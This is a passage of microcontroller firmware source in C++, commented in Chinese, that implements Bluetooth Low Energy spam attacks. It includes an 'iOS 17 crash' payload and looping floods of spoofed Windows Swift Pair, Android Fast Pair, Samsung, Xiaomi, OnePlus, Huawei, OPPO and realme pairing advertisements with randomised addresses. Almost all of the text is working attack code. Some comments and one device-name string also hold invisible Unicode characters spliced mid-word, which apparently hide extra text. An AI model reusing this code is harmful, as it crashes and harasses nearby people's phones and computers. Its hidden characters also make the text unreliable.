    unsigned long start = millis();
    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
    while (millis() - start < currentDelay) { 
      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
      delay(5); // 优化：从10ms减少到5ms
    }
  }
  performCompleteBleCleanup();
}

// iOS 17 Crash (from fl-BLE_SPAM)
void blePopupStart_iOS17Crash() {
  const char* title = "[iOS 17 崩溃攻击]";
  drawBlePopupDisplay(title);

  bleEnsureInitAndParams();

  // Action types for crash payload
  const uint8_t actions[] = {
    0x13, // AppleTV AutoFill
    0x27, // AppleTV Connecting...
    0x20, // Join This AppleTV?
    0x19, // AppleTV Audio Sync
    0x1E, // AppleTV Color Balance
    0x09, // Setup New iPhone
    0x02, // Transfer Phone Number
    0x0B, // HomePod Setup
    0x01, // Setup New AppleTV
    0x06, // Pair AppleTV
    0x0D, // HomeKit AppleTV Setup
    0x2B, // AppleID for AppleTV?
  };
  const size_t actionCount = sizeof(actions) / sizeof(actions[0]);

  unsigned long lastDisplayUpdate = 0;
  
  while (true) {
    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;

    BLE.configAdvert()->stopAdv();
    uint8_t rnd[6]; 
    le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); 
    le_set_rand_addr(rnd);

    // Build iOS 17 crash packet (Custom Crash from fl-BLE_SPAM)
    uint8_t action = actions[random(0, actionCount)];
    uint8_t flag = 0xC0;
    
    if (action == 0x20 && random(0, 2)) flag--; // More spam for 'Join This AppleTV?'
    if (action == 0x09 && random(0, 2)) flag = 0x40; // Glitched 'Setup New Device'
    
    uint8_t packet[17];
    uint8_t i = 0;
    
    packet[i++] = 16; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
    packet[i++] = 0x00; // ...
    packet[i++] = 0x0F; // Continuity Type (Nearby Action)
    packet[i++] = 0x05; // Continuity Size
    packet[i++] = flag; // Action Flags
    packet[i++] = action; // Action Type
    // Authentication Tag (3 bytes random)
    packet[i++] = random(0, 256);
    packet[i++] = random(0, 256);
    packet[i++] = random(0, 256);
    
    packet[i++] = 0x00; // Terminator (?)
    packet[i++] = 0x00; // ...
    
    packet[i++] = 0x10; // Continuity Type (Nearby Info)
    // Shenanigans (3 bytes random)
    packet[i++] = random(0, 256);
    packet[i++] = random(0, 256);
    packet[i++] = random(0, 256);

    BLEAdvertData adv;
    adv.addData(packet, 17);
    BLE.configAdvert()->setAdvData(adv);
    BLE.configAdvert()->setScanRspData(adv);
    BLE.configAdvert()->updateAdvertParams();
    BLE.configAdvert()->startAdv();

    unsigned long start = millis();
    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
    while (millis() - start < currentDelay) { 
      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
      delay(5); // 优化：从10ms减少到5ms
    }
  }
  performCompleteBleCleanup();
}

// 占位页面：显示提示文本，任意键返回
void blePlaceholderPage() {
  while (true) {
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    const char* msg = "关注永雏塔菲喵";
    int w = u8g2_for_adafruit_gfx.getUTF8Width(msg);
    int x = (display.width() - w) / 2; if (x < 0) x = 0;
    int y = (display.height() / 2) + 4; // 基线微调
    u8g2_for_adafruit_gfx.setCursor(x, y);
    u8g2_for_adafruit_gfx.print(msg);
    display.display();
    // 任意键退出
    if (digitalRead(BTN_BACK) == LOW || digitalRead(BTN_OK) == LOW || digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) { delay(200); break; }
    delay(10);
  }
}

// W󠅧󠅧󠅧󠄞󠇖󠆇󠆐󠇕󠆀󠅽󠄞󠅤󠅟󠅠indows Swift Pair popup (simplified)
void blePopupStart_WindowsSwiftPair() {
  const char* title = "[Windows Swift Pair]";
  drawBlePopupDisplay(title);

  bleEnsureInitAndParams();

  const char* names[] = {"www.无名.top","ごとう ひとり","いじちにじか","やまだ リョウ","きた いくよ","因幡めぐる","Ciallo～(∠・ω< )⌒☆"};
  const size_t nameCount = sizeof(names)/sizeof(names[0]);
  unsigned long lastDisplayUpdate = 0;

  while (true) {
    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
    
    BLE.configAdvert()->stopAdv();

    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);

    const char* nm = names[(size_t)random(0, (int)nameCount)];
    size_t nlen = strlen(nm); if (nlen > 20) nlen = 20;

    // Build Manufacturer S󠅗󠅙󠅤󠅘󠅥󠅒󠄞󠅓󠅟󠅝󠄟󠄶󠅜󠅩󠅙󠅞󠅗󠄹󠅓󠅕󠅩󠅩󠅔󠅣󠄟󠄲󠅇󠄡󠄦󠄝󠅄󠅟󠅟󠅜󠅣pecific: Company ID 0x0006 (Micro󠅗󠅙󠅤󠅘󠅥󠅒󠄞󠅓󠅟󠅝󠄟󠄶󠅜󠅩󠅙󠅞󠅗󠄹󠅓󠅕󠅩󠅩󠅔󠅣󠄟󠄲󠅇󠄡󠄦󠄝󠅄󠅟󠅟󠅜󠅣soft)
    uint8_t buf[31];
    uint8_t L = (uint8_t)(1 + 2 + 3 + nlen);
    if (L > 0x1F) L = 0x1F;
    buf[0] = L; buf[1] = 0xFF; buf[2] = 0x06; buf[3] = 0x00; buf[4]=0x03; buf[5]=0x00; buf[6]=0x80;
    memcpy(&buf[7], nm, nlen);

    BLEAdvertData adv; adv.addData(buf, (uint8_t)(L+1));
    BLE.configAdvert()->setAdvData(adv);
    BLE.configAdvert()->setScanRspData(adv);
    BLE.configAdvert()->updateAdvertParams();
    BLE.configAdvert()->startAdv();

    // 使用󠅧󠅧󠅧󠄞󠇖󠆇󠆐󠇕󠆀󠅽󠄞󠅤󠅟󠅠标准的延时循环，支持速率控制按键
    unsigned long start = millis();
    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
    while (millis() - start < currentDelay) { 
      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
      delay(5); // 优化：从10ms减少到5ms
    }
  }
  performCompleteBleCleanup();
}

// Android Fast Pair (simplified)
void blePopupStart_AndroidFastPair() {
  const char* title = "[Android Fast Pair]";
  drawBlePopupDisplay(title);

  bleEnsureInitAndParams();
  unsigned long lastDisplayUpdate = 0;
  while (true) {
    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
    
    BLE.configAdvert()->stopAdv();
    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
    // Service Data UUID FE2C + random model id
    uint8_t sd[8] = {6,0x16,0x2C,0xFE,(uint8_t)random(0,256),(uint8_t)random(0,256),(uint8_t)random(0,256)};
    BLEAdvertData adv; adv.addData(sd, 7);
    BLE.configAdvert()->setAdvData(adv);
    BLE.configAdvert()->setScanRspData(adv);
    BLE.configAdvert()->updateAdvertParams();
    BLE.configAdvert()->startAdv();
    
    unsigned long start = millis();
    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
    while (millis() - start < currentDelay) { 
      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
      delay(5); // 优化：从10ms减少到5ms
    }
  }
  performCompleteBleCleanup();
}

// Extended BLE popup start functions (ported from backup, adapted to current style)

void blePopupStart_SamsungEasySetup() {
  const char* title = "[三星 EasySetup]";
  drawBlePopupDisplay(title);

  bleEnsureInitAndParams();

  const char* names[] = {"Gal󠅗󠅙󠅤󠅘󠅥󠅒󠄞󠅓󠅟󠅝󠄟󠄶󠅜󠅩󠅙󠅞󠅗󠄹󠅓󠅕󠅩󠅩󠅔󠅣󠄟󠄲󠅇󠄡󠄦󠄝󠅄󠅟󠅟󠅜󠅣axy Buds","Galaxy Buds2","Galaxy Buds Pro","Galaxy Watch"};
  const size_t nameCount = sizeof(names)/sizeof(names[0]);
  unsigned long lastDisplayUpdate = 0;

  while (true) {
    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
    
    BLE.configAdvert()->stopAdv();

    // Use non-resolvable random address to avoid caching issues
    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);

    BLEAdvertData adv;
    // Add flags first (LE General Discoverable + BR/EDR Not Supported)
    adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);

    // Manufacturer Specific (Samsung = 0x0075)
    // Minimal plausible EasySetup beacon payload (preamble + random bytes)
    const char* nm = names[(size_t)random(0,(int)nameCount)];

    uint8_t payload[12];
    // Example preamble bytes
    payload[0] = 0x01; // scenario/type
    payload[1] = 0x00; // flags
    payload[2] = 0x00; // reserved
    payload[3] = 0x00; // reserved
    // random bytes to vary frame
    for (int i=4;i<12;i++) payload[i] = (uint8_t)random(0,256);

    // Build AD structure: len = 1(type)+2(company)+payload_len
    const uint8_t payload_len = sizeof(payload);
    const uint8_t L = (uint8_t)(1 + 2 + payload_len);
    uint8_t mfg[1 + 1 + 2 + sizeof(payload)];
    mfg[0] = L; mfg[1] = 0xFF; // Manufacturer Specific
    mfg[2] = 0x75; mfg[3] = 0x00; // Samsung company ID (LSB first)
    memcpy(&mfg[4], payload, payload_len);
    adv.addData(mfg, sizeof(mfg));

    // Put device name into scan response
    BLEAdvertData scan;
    scan.addCompleteName(nm);

    BLE.configAdvert()->setAdvData(adv);
    BLE.configAdvert()->setScanRspData(scan);
    BLE.configAdvert()->updateAdvertParams();
    BLE.configAdvert()->startAdv();

    unsigned long start = millis();
    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
    while (millis() - start < currentDelay) { 
      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
      delay(5); // 优化：从10ms减少到5ms
    }
  }
  performCompleteBleCleanup();
}

void blePopupStart_XiaomiFastPair() {
  const char* title = "[小米/红米 快速配对]";
  drawBlePopupDisplay(title);

  bleEnsureInitAndParams();

  // Xiaomi/Redmi Model IDs (3-byte Fast Pair Model IDs)
  const uint8_t xiaomiModels[][3] = {
    {0x8E,0x61,0xC1}, // Redmi Buds 4 lite (8E61C1)
    {0x6C,0x52,0x1F}  // Redmi Buds 4 Active (6C521F)
  };
  const size_t modelCount = sizeof(xiaomiModels)/sizeof(xiaomiModels[0]);
  unsigned long lastDisplayUpdate = 0;

  while (true) {
    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;

    BLE.configAdvert()->stopAdv();

    // Randomize advertiser address (non-resolvable)
    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);

    BLEAdvertData adv;
    // Flags
    adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);

    // 1) Service UUID List (16-bit) -> FE2C (Google Fast Pair)
    uint8_t suuid[4];
    suuid[0] = 3;      // length of (type + 2-byte UUID)
    suuid[1] = 0x03;   // Complete List of 16-bit Service Class UUIDs
    suuid[2] = 0x2C;   // UUID LSB
    suuid[3] = 0xFE;   // UUID MSB
    adv.addData(suuid, sizeof(suuid));

    // 2) Service Data (UUID FE2C + Model ID)
    const uint8_t* mid = xiaomiModels[(size_t)random(0,(int)modelCount)];
    uint8_t sdata[8];
    sdata[0] = 6;      // length of (type + 2-byte UUID + 3-byte model)
    sdata[1] = 0x16;   // Service Data - 16-bit UUID
    sdata[2] = 0x2C;   // UUID LSB
    sdata[3] = 0xFE;   // UUID MSB
    sdata[4] = mid[0]; // Model ID byte 2
    sdata[5] = mid[1]; // Model ID byte 1
    sdata[6] = mid[2]; // Model ID byte 0
    adv.addData(sdata, 7);

    // 3) Tx Power (optional)
    int8_t txp = (int8_t)((random(0, 121)) - 100); // -100..+20
    uint8_t txpSeg[4];
    txpSeg[0] = 2;       // length of (type + 1-byte power)
    txpSeg[1] = 0x0A;    // Tx Power Level
    txpSeg[2] = (uint8_t)txp;
    adv.addData(txpSeg, 3);

    BLE.configAdvert()->setAdvData(adv);
    BLE.configAdvert()->setScanRspData(adv);
    BLE.configAdvert()->updateAdvertParams();
    BLE.configAdvert()->startAdv();

    unsigned long start = millis();
    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
    while (millis() - start < currentDelay) { 
      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
      delay(5); // 优化：从10ms减少到5ms
    }
  }
  performCompleteBleCleanup();
}

static void blePopupShowFastPairInfo() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  const char* l1 = "由于谷歌的协议更新";
  const char* l2 = "仅对部分旧版安卓有效";
  const char* l3 = "可用于安卓版本<12";
  const char* l4 = "且支持快速配对的设备";
  int w1 = u8g2_for_adafruit_gfx.getUTF8Width(l1); int x1 = (display.width()-w1)/2; if (x1<0) x1=0;
  int w2 = u8g2_for_adafruit_gfx.getUTF8Width(l2); int x2 = (display.width()-w2)/2; if (x2<0) x2=0;
  int w3 = u8g2_for_adafruit_gfx.getUTF8Width(l3); int x3 = (display.width()-w3)/2; if (x3<0) x3=0;
  int w4 = u8g2_for_adafruit_gfx.getUTF8Width(l4); int x4 = (display.width()-w4)/2; if (x4<0) x4=0;
  u8g2_for_adafruit_gfx.setCursor(x1, 20); u8g2_for_adafruit_gfx.print(l1);
  u8g2_for_adafruit_gfx.setCursor(x2, 32); u8g2_for_adafruit_gfx.print(l2);
  u8g2_for_adafruit_gfx.setCursor(x3, 44); u8g2_for_adafruit_gfx.print(l3);
  u8g2_for_adafruit_gfx.setCursor(x4, 56); u8g2_for_adafruit_gfx.print(l4);
  display.display();
  while (true) { if (digitalRead(BTN_BACK) == LOW || digitalRead(BTN_OK) == LOW) { delay(200); break; } delay(10);} 
}

void blePopupStart_OnePlusFastPair() {
  const char* title = "[一加 快速配对]";
  drawBlePopupDisplay(title);

  bleEnsureInitAndParams();

  const uint8_t models[][3] = {
    {0x8A,0x7A,0x95}, // OnePlus Watch 2
    {0x1E,0xC1,0x11}
  };
  const size_t count = sizeof(models)/sizeof(models[0]);
  unsigned long lastDisplayUpdate = 0;

  while (true) {
    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
    
    BLE.configAdvert()->stopAdv();
    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);

    BLEAdvertData adv; adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
    uint8_t suuid[4] = {3, 0x03, 0x2C, 0xFE}; adv.addData(suuid, sizeof(suuid));
    const uint8_t* mid = models[(size_t)random(0,(int)count)];
    uint8_t sdata[8] = {6, 0x16, 0x2C, 0xFE, mid[0], mid[1], mid[2]}; adv.addData(sdata, 7);
    int8_t txp = (int8_t)((random(0,121)) - 100); uint8_t txBuf[3]={2,0x0A,(uint8_t)txp}; adv.addData(txBuf,3);

    BLE.configAdvert()->setAdvData(adv);
    BLE.configAdvert()->setScanRspData(adv);
    BLE.configAdvert()->updateAdvertParams();
    BLE.configAdvert()->startAdv();

    unsigned long start = millis();
    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
    while (millis() - start < currentDelay) { 
      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
      delay(5); // 优化：从10ms减少到5ms
    }
  }
  performCompleteBleCleanup();
}

void blePopupStart_HuaweiFastPair() {
  const char* title = "[华为 快速配对]";
  drawBlePopupDisplay(title);

  bleEnsureInitAndParams();

  const uint8_t models[][3] = {
    {0x20,0x22,0x08}
  };
  const size_t count = sizeof(models)/sizeof(models[0]);
  unsigned long lastDisplayUpdate = 0;

  while (true) {
    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
    
    BLE.configAdvert()->stopAdv();
    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);

    BLEAdvertData adv; adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
    uint8_t suuid[4] = {3, 0x03, 0x2C, 0xFE}; adv.addData(suuid, sizeof(suuid));
    const uint8_t* mid = models[(size_t)random(0,(int)count)];
    uint8_t sdata[8] = {6, 0x16, 0x2C, 0xFE, mid[0], mid[1], mid[2]}; adv.addData(sdata, 7);
    int8_t txp = (int8_t)((random(0,121)) - 100); uint8_t txBuf[3]={2,0x0A,(uint8_t)txp}; adv.addData(txBuf,3);

    BLE.configAdvert()->setAdvData(adv);
    BLE.configAdvert()->setScanRspData(adv);
    BLE.configAdvert()->updateAdvertParams();
    BLE.configAdvert()->startAdv();

    unsigned long start = millis();
    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
    while (millis() - start < currentDelay) { 
      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
      delay(5); // 优化：从10ms减少到5ms
    }
  }
  performCompleteBleCleanup();
}

void blePopupStart_OppoFastPair() {
  const char* title = "[OPPO 快速配对]";
  drawBlePopupDisplay(title);

  bleEnsureInitAndParams();

  const uint8_t models[][3] = {
    {0xCA,0x4D,0xE1},
    {0x92,0x16,0x3A}
  };
  const size_t count = sizeof(models)/sizeof(models[0]);
  unsigned long lastDisplayUpdate = 0;

  while (true) {
    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
    
    BLE.configAdvert()->stopAdv();
    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);

    BLEAdvertData adv; adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
    uint8_t suuid[4] = {3, 0x03, 0x2C, 0xFE}; adv.addData(suuid, sizeof(suuid));
    const uint8_t* mid = models[(size_t)random(0,(int)count)];
    uint8_t sdata[8] = {6, 0x16, 0x2C, 0xFE, mid[0], mid[1], mid[2]}; adv.addData(sdata, 7);
    int8_t txp = (int8_t)((random(0,121)) - 100); uint8_t txBuf[3]={2,0x0A,(uint8_t)txp}; adv.addData(txBuf,3);

    BLE.configAdvert()->setAdvData(adv);
    BLE.configAdvert()->setScanRspData(adv);
    BLE.configAdvert()->updateAdvertParams();
    BLE.configAdvert()->startAdv();

    unsigned long start = millis();
    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
    while (millis() - start < currentDelay) { 
      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
      delay(5); // 优化：从10ms减少到5ms
    }
  }
  performCompleteBleCleanup();
}

void blePopupStart_RealmeFastPair() {
  const char* title = "[realme 快速配对]";
  drawBlePopupDisplay(title);

  bleEnsureInitAndParams();

  const uint8_t models[][3] = {
    {0xD5,0xC6,0xCE},
    {0x8C,0xD1,0x0F},
    {0x8C,0x6B,0x6A}
  };
  const size_t count = sizeof(models)/sizeof(models[0]);
  unsigned long lastDisplayUpdate = 0;

  while (true) {
    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
    
    BLE.configAdvert()->stopAdv();
    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);

    BLEAdvertData adv; adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
    uint8_t suuid[4] = {3, 0x03, 0x2C, 0xFE}; adv.addData(suuid, sizeof(suuid));
    const uint8_t* mid = models[(size_t)random(0,(int)count)];
    uint8_t sdata[8] = {6, 0x16, 0x2C, 0xFE, mid[0], mid[1], mid[2]}; adv.addData(sdata, 7);
    int8_t txp = (int8_t)((random(0,121)) - 100); uint8_t txBuf[3]={2,0x0A,(uint8_t)txp}; adv.addData(txBuf,3);

    BLE.configAdvert()->setAdvData(adv);
    BLE.configAdvert()->setScanRspData(adv);
    BLE.configAdvert()->updateAdvertParams();
    BLE.configAdvert()->startAdv();

    unsigned long start = millis();
    unsigned long currentDelay = (unsigned long)getBlePopupDelay();
    while (millis() - start < currentDelay) {
      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
      delay(10); 
    }
  }
  performCompleteBleCleanup();
}

// 海内存知己，天涯若比邻
// myblog.top